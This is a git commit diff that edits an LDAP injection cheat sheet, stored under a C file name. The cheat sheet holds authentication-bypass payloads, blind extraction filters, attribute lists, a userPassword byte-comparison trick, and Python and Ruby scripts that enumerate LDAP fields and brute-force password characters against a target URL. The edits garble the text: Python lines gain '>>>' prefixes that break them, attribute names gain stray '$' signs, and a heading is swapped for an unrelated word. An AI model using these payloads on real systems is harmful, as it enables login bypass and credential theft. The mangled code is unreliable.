8cd232ea12b7cd1c6ec255341d7e98913eea811d
Z4 <30985576+TheProdigyLeague@users.noreply.github.com>
2023-03-30 23:27:21 -0400

    提炼

--- Dir_Access/traversalUI.c
+++ Dir_Access/traversalUI.c
@@ -1,9 +1,8 @@
 # LDAP injection
-
-> LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
-
+> Lightweight Directory Access Protocol (LDAP) Injection 
+> Used to exploit (WBA) web based applications that construct LDAP statements based on user input...
+> An application fails to properly sanitize user input. Mod LDAP statements using a Burp Suite--local proxy.
 ## Summary
-
 * [Exploitation](#exploitation)
 * [Payloads](#payloads)
 * [Blind Exploitation](#blind-exploitation)
@@ -12,27 +11,20 @@
 * [Scripts](#scripts)
   * [Discover valid LDAP fields](#discover-valid-ldap-fields)
   * [Special blind LDAP injection](#special-blind-ldap-injection)
-
 ## Exploitation
-
 Example 1.
-
 ```sql
 user  = *)(uid=*))(|(uid=*
 pass  = password
 query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
 ```
-
 Example 2
-
 ```sql
 user  = admin)(!(&(1=0
 pass  = q))
 query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 ```
-
 ## Payloads
-
 ```text
 *
 *)(&
@@ -55,10 +47,8 @@ admin*)((|userpassword=*)
 admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
 ```
-
-## Blind Exploitation
-
-We can extract using a bypass login
+## 提炼
+>We can [extract] using a [bypass] [login]
 
 ```sql
 (&(sn=administrator)(password=*))    : OK
@@ -80,71 +70,55 @@ We can extract using a bypass login
 
 ## Defaults attributes
 
-Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
+>Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
 
 ```bash
-userPassword
-surname
-name
-cn
-sn
-objectClass
-mail
-givenName
-commonName
+$userPassword
+$surname
+$name
+$cn
+$sn
+$objectClass
+$mail
+$givenName
+$commonName
 ```
 
 ## Exploiting userPassword attribute
 
-`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
-In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
-
+>`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
+> In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
 > octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.
-
 ```bash
-userPassword:2.5.13.18:=\xx (\xx is a byte)
-userPassword:2.5.13.18:=\xx\xx
-userPassword:2.5.13.18:=\xx\xx\xx
+$userPassword:2.5.13.18:=\xx (\xx is a byte)
+$userPassword:2.5.13.18:=\xx\xx
+$userPassword:2.5.13.18:=\xx\xx\xx
 ```
-
 ## Scripts
-
 ### Discover valid LDAP fields
-
 ```python
 #!/usr/bin/python3
-
-import requests
-import string
-
-fields = []
-
-url = 'https://URL.com/'
-
-f = open('dic', 'r') #Open the wordlists of common attributes
-wordl = f.read().split('\n')
-f.close()
-
-for i in wordl:
+>>>import requests
+>>>import string
+>>>fields = []
+>>>url = 'https://URL.com/'
+>>>f = open('dic', 'r') #Open the wordlists of common attributes
+>>>wordl = f.read().split('\n')
+>>>f.close()
+>>>for i in wordl:
     r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
     if 'TRUE CONDITION' in r.text:
         fields.append(str(i))
-
-print(fields)
+>>>print(fields)
 ```
-
 Ref. [5][5]
-
 ### Special blind LDAP injection (without "*")
-
 ```python
 #!/usr/bin/python3
-
-import requests, string
-alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
-
-flag = ""
-for i in range(50):
+>>>import requests, string
+>>>alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+>>>flag = ""
+>>>for i in range(50):
     print("[i] Looking for number " + str(i))
     for char in alphabet:
         r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
@@ -153,17 +127,12 @@ for i in range(50):
             print("[+] Flag: " + flag)
             break
 ```
-
 Ref. [5][5]
-
 ```ruby
 #!/usr/bin/env ruby
-
 require 'net/http'
 alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
-
 flag = ''
-
 (0..50).each do |i|
   puts("[i] Looking for number #{i}")
   alphabet.each do |char|
